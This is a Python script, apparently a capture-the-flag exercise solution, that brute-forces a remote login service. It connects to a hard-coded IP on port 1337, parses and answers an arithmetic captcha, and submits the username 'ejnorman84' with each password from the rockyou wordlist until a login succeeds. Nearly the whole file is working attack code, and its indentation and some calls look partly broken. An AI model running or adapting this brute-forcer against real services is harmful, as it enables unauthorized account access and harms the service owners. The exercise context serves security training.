import time
import re 
"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:
        $ nc <ip address here> <port here>
    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.
    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.
    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.
    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.
"""

import socket

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    
       # Sockets: https://docs.python.org/2/library/socket.html
       # How to use the socket s:
            # Establish socket connection
	    with open(wordlist) as file:
		line = file.readline()
		while line:
		    flag = 1
		    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           	    s.connect((host, port))
  	            data = s.recv(1100)     # Receives 1024 bytes from IP/Port
 		    print(data)             # Prints data
		    try:
	    	    	any = re.findall("(\d+) ([\/\-\+\*]) (\d+)", data)
	    	    	time.sleep(.5)
		    	arg1, arg2, arg3 = any[0]
		    except IndexError:
			flag = 0
			print("Trying Again")
		    count = 1
	            result = 0
	    	    x = int(arg1)
		    y = int(arg3)
		    #print(arg1 + " " + arg2 + " " + arg3)
		    if arg2 == "+":
			result = x + y
		    if arg2 == "-":
			result = x - y
		    if arg2 == "/":
  			if y == 0:
				result = 0;
			else:
				result = x / y
    		    if arg2 == "*":
			result = x * y
		    ans = str(result)
		    print(ans)
		    s.send(ans + "\n")   # Send a newline \n at the end of your command
       		    time.sleep(1)
		    data_two = s.recv(1024)
		    print(data_two)
		    time.sleep(1)
		    s.send("ejnorman84\n")
		    data_three = s.recv(1024)
		    print(data_three)
		    s.send(line)
		    time.sleep(1)
		    data_four = s.recv(1024)
		    print(data_four)
		    #time.sleep(1)
		    if(re.match(".*Fail.*" , data_four)):
			line = file.readline()
			count += 1
			s.close
			time.sleep(.5)
		    elif flag == 0:
			s.close
		    else:
			print("!!!!!!!!!!!!!PASSWORD: " + line + " !!!!!!!!!!!")
			break

        #    Reading:

       # General idea:
       #     Given that you know a potential username, use a wordlist and iterate
       #     through each possible password and repeatedly attempt to login to
       #     v0idcache's server.


#	    username = "ejnorman84"   # Hint: use OSINT
# 	    password = "wordlist"   # Hint: use wordlist




if __name__ == '__main__':
    brute_force()
